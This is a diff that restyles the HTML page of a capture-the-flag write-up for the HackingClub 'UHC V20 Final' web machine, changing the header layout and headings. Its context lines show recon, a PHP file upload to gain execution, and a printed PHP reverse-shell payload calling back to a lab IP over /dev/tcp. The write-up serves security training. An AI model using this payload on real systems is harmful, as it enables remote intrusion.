@@ -15,34 +15,24 @@
 
         <main>
             <article class="content">
-                <h1>[HackingClub] UHC V20 Final Writeup</h1>
-                
-                <div class="box-info">
-                    <table>
-                        <tr>
-                            <td>Platform:</td>
-                            <td>HackingClub</td>
-                        </tr>
-                        <tr>
-                            <td>Machine:</td>
-                            <td>UHC V20 Final</td>
-                        </tr>
-                        <tr>
-                            <td>Category:</td>
-                            <td>Web Exploitation</td>
-                        </tr>
-                        <tr>
-                            <td>OS:</td>
-                            <td>Linux</td>
-                        </tr>
-                        <tr>
-                            <td>Difficulty:</td>
-                            <td><span class="difficulty hard">Hard</span></td>
-                        </tr>
-                    </table>
+                <a class="back-link" href="../hackingclub.html">← hackingclub</a>
+
+                <div class="article-head">
+                    <span class="badge badge-hc">HC</span>
+                    <span class="diff diff-hard">hard</span>
+                    <span class="article-cat">· linux / web</span>
                 </div>
 
-                <div class="tags" style="margin-bottom: 30px;">
+                <h1>UHC V20 Final</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackingClub</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">UHC V20 Final</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
                     <span class="tag">lfi</span>
                     <span class="tag">prototype pollution</span>
                     <span class="tag">node</span>
@@ -50,7 +40,7 @@
 
                 <img src="../../images/hackingclub/uhc-v20/index.png" alt="UHC V20 Machine" style="max-width: 100%; margin-bottom: 20px;">
 
-                <h2>## Recon</h2>
+                <h2>Recon</h2>
                 
                 <p>In the beginning, I used <code>nmap</code> with the following parameters. I found only ports 22, 80 (web server apache using PHP), 111 and 3000 (web server using Express from nodejs).</p>
 
@@ -121,7 +111,7 @@ assets                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 
 
                 <p>Inside <code>/uploads</code>, we can found a file named <code>shell.php5</code>.</p>
 
-                <h2>## Exploitation</h2>
+                <h2>Exploitation</h2>
                 
                 <p>I'll test this attack vector from input. So lets go make a request with a input <code>email</code> and <code>the_file</code> to <code>/email.php</code> using burp. We can test upload a file with extension php5.</p>
 
@@ -148,7 +138,7 @@ Content-Type: application/x-php
                 <p>Now we can get a reverse shell and logging into apache =D. We will use:</p>
                 <pre><code>&lt;?php system("/bin/bash -c 'sh -i &gt;&amp; /dev/tcp/10.0.10.235/4444 0&gt;&amp;1'");?&gt;</code></pre>
 
-                <h2>## Post exploitation</h2>
+                <h2>Post exploitation</h2>
                 
                 <p>In <code>ps aux</code> we have a process with node server running in user <code>uhc</code> in port 3000 (nmap). So we need verify the code inside /opt/uhclabs.</p>
 
@@ -301,9 +291,6 @@ Content-Length: 142
                 </div>
             </article>
 
-            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
-                <a href="../../writeups.html">&lt;&lt; Back to Writeups</a>
-            </div>
         </main>
 
         <div data-component="footer" data-base-path="../../"></div>
